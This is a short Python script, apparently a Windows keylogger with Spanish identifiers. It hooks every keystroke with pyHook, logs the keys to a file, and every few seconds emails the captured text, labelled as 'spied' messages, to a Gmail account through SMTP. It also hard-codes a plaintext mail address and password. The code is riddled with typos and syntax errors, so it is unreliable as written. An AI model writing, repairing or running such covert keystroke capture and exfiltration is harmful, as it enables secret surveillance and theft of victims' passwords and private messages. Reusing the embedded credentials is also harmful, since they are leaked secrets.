import pyHook, pythonce, sys, logging, time, datatime

carpeta_destino= ''
segundos_espera= 7
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def EnviarMail()
    with ompen(carpeta_destino, 'r+') as f:
        fecha = datatime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data=f.read
        data= data.replace('Space', '')
        data = data.replace('\n', '')
        data = 'Mensaje espiado a las: '+fecha + '\n' + data
        print(data)
        crearMail('TOkkengraberv1@gmail.com', 'Lucas777200812', 'TOkkengraberv1@gmail.com', 'Nueva captura:' +fecha, data)
        f.seek(0)
        f.trunkcate()
def crearMail(user, passw, recp,subj, body)
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject= subj
    Txt=body

    email = """"\From: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
    
    try:
        server=smtplib.SMPT("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con exito')
    except:
        print('Correo fallido :(')

def OnKeyBoardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WIndowName:' event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.key)
    return True

hooks_manager= pyHook.HookManager()
hooks_manager.KeyDown= OnKeyBoardEvent
hooks_manager.HookKeyboard()

while True:
    if TomeOut():
        EnviarMail()
        timeout= time.time()+ segundos_espera
    pythoncom.PumpWaitingMessages()